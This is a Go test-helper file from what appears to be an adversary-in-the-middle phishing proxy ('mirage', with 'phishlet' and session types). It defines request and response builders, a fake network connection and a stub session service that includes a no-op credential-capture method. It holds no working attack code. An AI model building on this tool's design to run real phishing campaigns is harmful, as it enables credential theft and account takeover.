package proxy

import (
	"bytes"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// ── test helpers ─────────────────────────────────────────────────────────────

func testConn(phishlet *aitm.Phishlet, session *aitm.Session) *connection {
	return &connection{
		phishlet: phishlet,
		session:  session,
		server: &Server{
			Logger:         slog.New(slog.NewTextHandler(io.Discard, nil)),
			Spoof:          NewSpoofProxy("", slog.New(slog.NewTextHandler(io.Discard, nil))),
			ScoreThreshold: 0.6,
		},
	}
}

func testReq(method, rawURL string, body io.Reader) *http.Request {
	req, _ := http.NewRequest(method, rawURL, body)
	u, _ := url.Parse(rawURL)
	req.Host = u.Host
	return req
}

func testResp(code int, contentType, body string) *http.Response {
	return &http.Response{
		StatusCode:    code,
		Header:        http.Header{"Content-Type": []string{contentType}},
		Body:          io.NopCloser(strings.NewReader(body)),
		ContentLength: int64(len(body)),
		Request:       &http.Request{URL: &url.URL{Path: "/"}, Header: http.Header{}},
	}
}

// ── stub services ────────────────────────────────────────────────────────────

type stubSessionSvc struct{}

func (s *stubSessionSvc) Get(_ string) (*aitm.Session, error)                 { return nil, nil }
func (s *stubSessionSvc) NewSession(_, _, _, _ string) (*aitm.Session, error) { return nil, nil }
func (s *stubSessionSvc) Update(_ *aitm.Session) error                        { return nil }
func (s *stubSessionSvc) Complete(_ *aitm.Session) error                      { return nil }
func (s *stubSessionSvc) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool   { return false }
func (s *stubSessionSvc) CaptureCredentials(_ *aitm.Session) error            { return nil }

// fakeConn is a minimal net.Conn backed by a bytes.Reader.
type fakeConn struct {
	r *bytes.Reader
}

func newFakeConn(data []byte) *fakeConn {
	return &fakeConn{r: bytes.NewReader(data)}
}

func (c *fakeConn) Read(b []byte) (int, error)         { return c.r.Read(b) }
func (c *fakeConn) Write(b []byte) (int, error)        { return len(b), nil }
func (c *fakeConn) Close() error                       { return nil }
func (c *fakeConn) LocalAddr() net.Addr                { return dummyAddr{} }
func (c *fakeConn) RemoteAddr() net.Addr               { return dummyAddr{} }
func (c *fakeConn) SetDeadline(_ time.Time) error      { return nil }
func (c *fakeConn) SetReadDeadline(_ time.Time) error  { return nil }
func (c *fakeConn) SetWriteDeadline(_ time.Time) error { return nil }

type dummyAddr struct{}

func (dummyAddr) Network() string { return "tcp" }
func (dummyAddr) String() string  { return "127.0.0.1:0" }
